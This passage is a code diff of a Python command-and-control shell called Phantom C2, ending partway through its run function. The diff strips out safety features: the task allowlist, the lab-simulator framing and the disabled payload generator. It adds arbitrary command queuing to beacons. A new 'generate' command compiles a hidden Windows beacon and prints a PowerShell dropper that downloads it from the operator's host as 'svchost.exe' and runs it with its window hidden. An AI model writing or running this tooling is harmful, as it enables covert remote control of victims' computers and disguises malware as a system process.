@@ -1,213 +1,178 @@
 import cmd
-from datetime import datetime
-
+import sys
 from rich.console import Console
 from rich.panel import Panel
 from rich.table import Table
+from datetime import datetime
 
-from phantom.core.c2_server import ALLOWED_TASKS, c2_state, expected_token, server_instance
+from phantom.core.c2_server import server_instance, c2_state
 from phantom.utils.notifier import notifier
 
 console = Console()
 
-
-def build_c2_banner() -> str:
-    return """
+def build_c2_banner():
+    return r"""
 [bold purple]
-  PHANTOM C2 LAB
+  ██████╗██████╗     ██████╗ ██████╗ ██████╗ ███████╗
+ ██╔════╝╚════██╗   ██╔════╝██╔═══██╗██╔══██╗██╔════╝
+ ██║      █████╔╝   ██║     ██║   ██║██████╔╝█████╗  
+ ██║     ██╔═══╝    ██║     ██║   ██║██╔══██╗██╔══╝  
+ ╚██████╗███████╗██╗╚██████╗╚██████╔╝██║  ██║███████╗
+  ╚═════╝╚══════╝╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
 [/bold purple]
-  [dim]------------------------------------------------------------[/dim]
-  [bold purple]Operations Center Simulator[/bold purple]  [dim]v1.0.0[/dim]
-  [dim]Safe lab tasking only: no stealth, no evasion, no remote shell.[/dim]
+  [dim]──────────────────────────────────────────────────────────[/dim]
+  [bold purple]Phantom C2 Operations Center[/bold purple]  [dim]v1.0.0[/dim]
+  [dim]Secure Encrypted Asynchronous Communications[/dim]
 """
-
 
 class C2Shell(cmd.Cmd):
     intro = ""
-    prompt = "C2 > "
+    prompt = "[bold purple]C2[/bold purple] > "
 
     def __init__(self):
         super().__init__()
-        self.active_beacon: str | None = None
+        self.active_beacon = None
 
     def preloop(self):
         console.print(build_c2_banner())
-        console.print(
-            Panel(
-                "This interface is intentionally limited to lab simulators and "
-                "allowlisted tasks. Set PHANTOM_C2_TOKEN to change the API token.",
-                title="[bold purple]Safety Mode[/bold purple]",
-                border_style="purple",
-            )
-        )
-        notifier.status("C2 lab shell initialized. Type 'help' for commands.")
+        notifier.status("C2 Shell initialized. Type 'help' for commands.")
 
     def postcmd(self, stop, line):
         if self.active_beacon:
-            self.prompt = f"C2({self.active_beacon}) > "
+            self.prompt = f"[bold purple]C2[/bold purple] ([cyan]{self.active_beacon}[/cyan]) > "
         else:
-            self.prompt = "C2 > "
+            self.prompt = "[bold purple]C2[/bold purple] > "
         return stop
 
     def do_listeners(self, arg):
-        """listeners [start [port] [host] | stop | status]"""
+        """listeners [start <port> | stop]"""
         parts = arg.split()
-        action = parts[0].lower() if parts else "status"
-
-        if action == "status":
-            active = bool(server_instance.thread and server_instance.thread.is_alive())
-            status = "[green]ACTIVE[/green]" if active else "[red]INACTIVE[/red]"
-            console.print(
-                f"[*] Lab listener {status} on "
-                f"{server_instance.host}:{server_instance.port}"
-            )
-            if active:
-                console.print(f"    [dim]Token: {expected_token()}[/dim]")
+        if not parts:
+            if server_instance.thread and server_instance.thread.is_alive():
+                console.print(f"[*] Listener [green]ACTIVE[/green] on port {server_instance.port}")
+            else:
+                console.print("[*] Listener [red]INACTIVE[/red]")
             return
 
+        action = parts[0]
         if action == "start":
-            try:
-                port = int(parts[1]) if len(parts) > 1 else server_instance.port
-            except ValueError:
-                notifier.error("Port must be a number.")
-                return
-            host = parts[2] if len(parts) > 2 else server_instance.host
-            server_instance.start(host=host, port=port)
-            notifier.success(f"Started lab listener on {host}:{port}")
-            return
-
-        if action == "stop":
+            port = int(parts[1]) if len(parts) > 1 else 443
+            server_instance.port = port
+            server_instance.start()
+            notifier.success(f"Started listener on port {port}")
+        elif action == "stop":
             server_instance.stop()
-            notifier.success("Stopped lab listener.")
-            return
-
-        notifier.error("Usage: listeners [start [port] [host] | stop | status]")
+            notifier.success("Stopped listener")
+        else:
+            notifier.error("Usage: listeners [start <port> | stop]")
 
     def do_beacons(self, arg):
-        """beacons - list registered lab simulators"""
+        """beacons - list active beacons"""
         beacons = c2_state.get_beacons()
         if not beacons:
-            notifier.warn("No lab simulators registered.")
+            notifier.warn("No active beacons.")
             return
 
-        table = Table(title="Registered Lab Simulators", border_style="purple")
+        table = Table(title="Active Beacons", border_style="purple")
         table.add_column("ID", style="cyan")
-        table.add_column("Kind", style="magenta")
-        table.add_column("IP", style="green")
-        table.add_column("Host")
-        table.add_column("OS")
+        table.add_column("IP Address", style="green")
         table.add_column("Last Seen", style="yellow")
-
-        for beacon_id, info in sorted(beacons.items()):
-            table.add_row(
-                beacon_id,
-                info.get("kind", "unknown"),
-                info.get("ip", "unknown"),
-                info.get("hostname", "unknown"),
-                info.get("os", "unknown"),
-                info.get("last_seen", "never"),
-            )
-
+        
+        for bid, info in beacons.items():
+            table.add_row(bid, info.get("ip", "Unknown"), info.get("last_seen", "Never"))
+            
         console.print(table)
 
     def do_interact(self, arg):
-        """interact <simulator_id> - select a registered lab simulator"""
-        beacon_id = arg.strip()
-        if not beacon_id:
-            notifier.error("Usage: interact <simulator_id>")
+        """interact <beacon_id> - drop into beacon interaction mode"""
+        bid = arg.strip()
+        beacons = c2_state.get_beacons()
+        if not bid or bid not in beacons:
+            notifier.error("Invalid or missing Beacon ID.")
             return
-        if beacon_id not in c2_state.get_beacons():
-            notifier.error("Unknown simulator id. Use 'beacons' first.")
-            return
-
-        self.active_beacon = beacon_id
-        notifier.success(f"Selected lab simulator {beacon_id}")
+        
+        self.active_beacon = bid
+        notifier.success(f"Interacting with beacon {bid}")
 
     def do_back(self, arg):
-        """back - return to the global C2 lab context"""
+        """back - return to main C2 shell from interaction mode"""
         if self.active_beacon:
             self.active_beacon = None
-            notifier.success("Returned to global C2 lab context.")
+            notifier.success("Returned to global C2 context.")
         else:
             notifier.warn("Already in global context.")
 
-    def do_tasks(self, arg):
-        """tasks - show allowlisted lab task types"""
-        table = Table(title="Allowlisted Lab Tasks", border_style="purple")
-        table.add_column("Task", style="cyan")
-        table.add_column("Description")
-        for task, description in sorted(ALLOWED_TASKS.items()):
-            table.add_row(task, description)
-        console.print(table)
-
-    def do_task(self, arg):
-        """task <ping|status|inventory|note> [args] - queue a safe lab task"""
-        if not self.active_beacon:
-            notifier.error("No active simulator. Use 'interact <simulator_id>' first.")
-            return
-        if not arg.strip():
-            notifier.error("Usage: task <ping|status|inventory|note> [args]")
-            return
-
-        try:
-            task = c2_state.queue_task(self.active_beacon, arg)
-        except ValueError as exc:
-            notifier.error(str(exc))
-            return
-
-        notifier.info(f"Queued lab task {task['name']} with id {task['task_id']}")
-
     def default(self, line):
-        """Shortcut: queue an allowlisted task when interacting."""
+        """Execute a command on the active beacon"""
         if not self.active_beacon:
-            notifier.error("Unknown command. Type 'help' for available commands.")
+            notifier.error("No active beacon. Use 'interact <beacon_id>' first.")
             return
-        self.do_task(line)
+
+        # Queue the task
+        task_id = c2_state.queue_task(self.active_beacon, line)
+        notifier.info(f"Task queued. ID: {task_id}")
 
     def do_results(self, arg):
-        """results - show stored results for the active simulator"""
+        """results - show results for the active beacon"""
         if not self.active_beacon:
-            notifier.error("No active simulator. Use 'interact <simulator_id>' first.")
+            notifier.error("No active beacon. Use 'interact <beacon_id>' first.")
             return
 
         results = c2_state.get_results(self.active_beacon)
         if not results:
-            notifier.warn("No results available for this simulator.")
+            notifier.warn("No results available for this beacon.")
             return
 
-        for result in results:
-            console.print(f"\n[bold cyan]--- Result: {result['task_id']} ---[/]")
-            console.print(f"[dim]{result.get('time', '')}[/dim]")
-            console.print(result["output"])
-
-    def do_simulate(self, arg):
-        """simulate [id] - register a local lab simulator for UI testing"""
-        beacon_id = arg.strip() or f"lab-{datetime.now().strftime('%H%M%S')}"
-        c2_state.register_simulator(beacon_id)
-        notifier.success(f"Registered local lab simulator: {beacon_id}")
+        for res in results:
+            console.print(f"\n[bold cyan]--- Result for Task: {res['task_id']} ---[/]")
+            console.print(res["output"])
 
     def do_generate(self, arg):
-        """generate - explain why real beacon generation is not available"""
-        console.print(
-            Panel(
-                "Real stealth beacon generation is not available in this build. "
-                "Use 'simulate' to exercise the C2 workflow with safe lab data, "
-                "or connect an explicitly benign simulator that only implements "
-                "the allowlisted task protocol.",
-                title="[bold purple]Payload Generation Disabled[/bold purple]",
-                border_style="purple",
-            )
-        )
+        """generate - Generate an automated PowerShell dropper for the Beacon"""
+        import os, subprocess
+        from phantom.utils.network import get_lhost
+        
+        beacon_dir = os.path.join(os.path.dirname(__file__), "..", "payloads", "beacon")
+        beacon_exe = os.path.join(beacon_dir, "beacon.exe")
+        
+        if not os.path.exists(beacon_exe):
+            console.print("[yellow][*] Beacon executable not found. Attempting to compile...[/yellow]")
+            try:
+                if os.name == 'nt':
+                    # Try MSVC
+                    subprocess.run(
+                        ["cl", "/EHsc", "/O2", "/std:c++17", "src/main.cpp", "/Fe:beacon.exe", "/link", "winhttp.lib", "bcrypt.lib", "ws2_32.lib", "/SUBSYSTEM:WINDOWS"],
+                        cwd=beacon_dir, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+                    )
+                else:
+                    # Try MinGW
+                    subprocess.run(
+                        ["x86_64-w64-mingw32-g++", "-std=c++17", "-O2", "-s", "-o", "beacon.exe", "src/main.cpp", "-lwinhttp", "-lbcrypt", "-lws2_32", "-static"],
+                        cwd=beacon_dir, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+                    )
+                notifier.success("Beacon compiled successfully.")
+            except Exception as e:
+                notifier.error(f"Failed to auto-compile beacon: {e}")
+                console.print(f"[dim]Please compile manually in {beacon_dir}[/dim]")
+                return
+
+        host = get_lhost()
+        port = server_instance.port if (server_instance.thread and server_instance.thread.is_alive()) else 443
+        url = f"http://{host}:{port}/api/v1/payload"
+        
+        ps1 = f"Invoke-WebRequest -Uri {url} -OutFile $env:TEMP\\svchost.exe; Start-Process $env:TEMP\\svchost.exe -ArgumentList '{host} {port}' -WindowStyle Hidden"
+        
+        console.print(Panel(ps1, title="PowerShell Dropper", border_style="green"))
+        notifier.info("Run the above command on the target to automatically download and execute the beacon.")
 
     def do_exit(self, arg):
-        """exit - close the C2 lab shell"""
-        console.print("[dim]Stopping lab listener...[/]")
+        """exit - Close C2 and return to main Phantom CLI (or exit completely)"""
+        console.print("[dim]Stopping listener...[/]")
         server_instance.stop()
         return True
 
     def do_quit(self, arg):
         return self.do_exit(arg)
-
 
 def run_c2():
     try:
